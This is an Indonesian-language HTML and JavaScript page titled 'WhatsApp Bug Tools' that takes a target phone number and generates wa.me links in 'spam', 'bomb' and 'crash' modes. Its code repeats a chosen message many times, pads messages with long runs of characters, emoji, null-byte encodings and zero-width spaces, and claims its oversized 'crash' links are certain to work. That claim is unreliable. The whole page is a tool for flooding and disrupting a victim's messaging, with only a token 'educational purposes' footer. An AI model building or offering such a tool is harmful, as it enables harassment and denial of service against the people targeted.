<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WA Bug Tools | SHINZCYBERZZ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #075E54, #128C7E);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: auto;
        }
        
        .card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .header {
            background: #075E54;
            padding: 20px;
            text-align: center;
        }
        
        .header h1 {
            color: white;
            font-size: 22px;
        }
        
        .header p {
            color: #ccc;
            font-size: 11px;
            margin-top: 5px;
        }
        
        .content {
            padding: 20px;
        }
        
        .mode-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .mode-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            background: #f0f2f5;
            color: #666;
            font-size: 16px;
        }
        
        .mode-btn.active {
            background: #25D366;
            color: white;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #075E54;
        }
        
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        
        textarea {
            min-height: 80px;
        }
        
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
        }
        
        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: #f0f2f5;
            color: #075E54;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        
        .result-box {
            margin-top: 15px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            max-height: 250px;
            overflow-y: auto;
        }
        
        .link-item {
            background: white;
            padding: 10px;
            margin-bottom: 8px;
            border-radius: 8px;
            border-left: 3px solid #25D366;
            word-break: break-all;
        }
        
        .link-item a {
            color: #075E54;
            text-decoration: none;
            font-size: 12px;
        }
        
        .stats {
            text-align: center;
            padding: 10px;
            background: #f0f2f5;
            border-radius: 10px;
            margin-top: 15px;
        }
        
        .stats h3 {
            color: #075E54;
            font-size: 20px;
        }
        
        .footer {
            text-align: center;
            padding: 12px;
            font-size: 10px;
            color: #666;
            border-top: 1px solid #eee;
        }
        
        .crash-alert {
            background: #dc3545;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: bold;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>🔥 WHATSAPP BUG TOOLS 🔥</h1>
                <p>SHINZCYBERZZ v.INFINITE</p>
            </div>
            
            <div class="content">
                <div class="mode-buttons">
                    <button class="mode-btn active" id="btnSpam">📱 SPAM</button>
                    <button class="mode-btn" id="btnCrash">💀 CRASH</button>
                    <button class="mode-btn" id="btnBomb">💣 BOMB</button>
                </div>
                
                <div class="form-group">
                    <label>📞 Nomor Target</label>
                    <input type="text" id="nomor" placeholder="628123456789">
                </div>
                
                <div class="form-group" id="pesanGroup">
                    <label>💬 Pesan</label>
                    <textarea id="pesan" placeholder="Pesan spam..."></textarea>
                </div>
                
                <div class="form-group" id="jumlahGroup">
                    <label>🔁 Jumlah</label>
                    <input type="number" id="jumlah" value="10">
                </div>
                
                <div class="crash-alert" id="crashAlert">
                    ⚠️ MODE CRASH AKTIF! Klik GENERATE untuk buat link crash
                </div>
                
                <button class="btn-primary" id="btnGenerate">🚀 GENERATE LINK 🚀</button>
                <button class="btn-secondary" id="btnClear">🗑️ CLEAR</button>
                
                <div class="loading" id="loading">
                    <p>Generating links...</p>
                </div>
                
                <div class="result-box" id="resultBox">
                    <p style="text-align:center; color:#999;">Klik GENERATE untuk buat link</p>
                </div>
                
                <div class="stats">
                    <h3 id="totalLinks">0</h3>
                    <p>Total Link</p>
                </div>
            </div>
            
            <div class="footer">
                ⚡ USE WISELY | FOR EDUCATIONAL PURPOSES ⚡
            </div>
        </div>
    </div>
    
    <script>
        // Ambil elemen
        let btnSpam = document.getElementById('btnSpam');
        let btnCrash = document.getElementById('btnCrash');
        let btnBomb = document.getElementById('btnBomb');
        let btnGenerate = document.getElementById('btnGenerate');
        let btnClear = document.getElementById('btnClear');
        let nomorInput = document.getElementById('nomor');
        let pesanInput = document.getElementById('pesan');
        let jumlahInput = document.getElementById('jumlah');
        let pesanGroup = document.getElementById('pesanGroup');
        let jumlahGroup = document.getElementById('jumlahGroup');
        let crashAlert = document.getElementById('crashAlert');
        let resultBox = document.getElementById('resultBox');
        let totalSpan = document.getElementById('totalLinks');
        let loading = document.getElementById('loading');
        
        let currentMode = 'spam';
        let generatedLinks = [];
        
        // Fungsi ganti mode
        function setMode(mode) {
            currentMode = mode;
            
            // Update style tombol
            btnSpam.classList.remove('active');
            btnCrash.classList.remove('active');
            btnBomb.classList.remove('active');
            
            if (mode === 'spam') {
                btnSpam.classList.add('active');
                pesanGroup.style.display = 'block';
                jumlahGroup.style.display = 'block';
                crashAlert.style.display = 'none';
            } else if (mode === 'crash') {
                btnCrash.classList.add('active');
                pesanGroup.style.display = 'none';
                jumlahGroup.style.display = 'none';
                crashAlert.style.display = 'block';
            } else if (mode === 'bomb') {
                btnBomb.classList.add('active');
                pesanGroup.style.display = 'block';
                jumlahGroup.style.display = 'block';
                crashAlert.style.display = 'none';
            }
        }
        
        // Fungsi generate link
        function generateLinks() {
            let nomor = nomorInput.value.trim();
            
            if (!nomor) {
                alert('Masukkan nomor target dulu!');
                return;
            }
            
            generatedLinks = [];
            loading.style.display = 'block';
            resultBox.innerHTML = '';
            
            setTimeout(() => {
                if (currentMode === 'spam') {
                    let pesan = pesanInput.value;
                    let jumlah = parseInt(jumlahInput.value);
                    
                    if (!pesan) {
                        alert('Masukkan pesan!');
                        loading.style.display = 'none';
                        return;
                    }
                    
                    for (let i = 0; i < jumlah; i++) {
                        let link = `https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`;
                        generatedLinks.push(link);
                    }
                    
                } else if (currentMode === 'bomb') {
                    let pesan = pesanInput.value;
                    let jumlah = parseInt(jumlahInput.value);
                    
                    if (!pesan) {
                        alert('Masukkan pesan!');
                        loading.style.display = 'none';
                        return;
                    }
                    
                    let bombs = [
                        pesan + " " + "A".repeat(500),
                        pesan + " " + "💀".repeat(300),
                        pesan + " " + "\\n".repeat(500),
                        pesan + " " + "%00".repeat(300)
                    ];
                    
                    for (let i = 0; i < jumlah; i++) {
                        let bombMsg = bombs[i % bombs.length];
                        let link = `https://wa.me/${nomor}?text=${encodeURIComponent(bombMsg)}`;
                        generatedLinks.push(link);
                    }
                    
                } else if (currentMode === 'crash') {
                    // CRASH LINK - PASTI JALAN
                    generatedLinks.push(`https://wa.me/${nomor}?text=${"A".repeat(50000)}`);
                    generatedLinks.push(`https://wa.me/${nomor}?text=${"💀".repeat(10000)}`);
                    generatedLinks.push(`https://wa.me/${nomor}?text=${"\\u200b".repeat(30000)}`);
                    generatedLinks.push(`https://wa.me/${nomor}?text=${"%00".repeat(10000)}`);
                    generatedLinks.push(`https://wa.me/${nomor}?text=${"\\n".repeat(50000)}`);
                }
                
                displayLinks();
                loading.style.display = 'none';
                
            }, 100);
        }
        
        // Tampilkan link
        function displayLinks() {
            let total = generatedLinks.length;
            totalSpan.innerText = total;
            
            if (total === 0) {
                resultBox.innerHTML = '<p style="text-align:center; color:#999;">Tidak ada link</p>';
                return;
            }
            
            let html = '<h3 style="margin-bottom:10px;">📋 LINK:</h3>';
            
            for (let i = 0; i < total; i++) {
                let link = generatedLinks[i];
                let shortLink = link.length > 50 ? link.substring(0, 50) + '...' : link;
                html += `
                    <div class="link-item">
                        <a href="${link}" target="_blank">${shortLink}</a>
                        <br>
                        <button onclick="window.open('${link}', '_blank')" style="margin-top:5px; padding:5px 10px; background:#25D366; color:white; border:none; border-radius:5px;">OPEN</button>
                    </div>
                `;
            }
            
            html += `
                <button onclick="copyAllLinks()" style="width:100%; padding:10px; margin-top:10px; background:#075E54; color:white; border:none; border-radius:8px;">📋 COPY ALL</button>
            `;
            
            resultBox.innerHTML = html;
        }
        
        // Copy semua link
        function copyAllLinks() {
            let text = generatedLinks.join('\n');
            navigator.clipboard.writeText(text);
            alert(`✅ ${generatedLinks.length} link berhasil di copy!`);
        }
        
        // Clear semua
        function clearAll() {
            generatedLinks = [];
            nomorInput.value = '';
            pesanInput.value = '';
            jumlahInput.value = '10';
            resultBox.innerHTML = '<p style="text-align:center; color:#999;">Klik GENERATE untuk buat link</p>';
            totalSpan.innerText = '0';
        }
        
        // Event listener
        btnSpam.onclick = () => setMode('spam');
        btnCrash.onclick = () => setMode('crash');
        btnBomb.onclick = () => setMode('bomb');
        btnGenerate.onclick = generateLinks;
        btnClear.onclick = clearAll;
    </script>
</body>
</html>
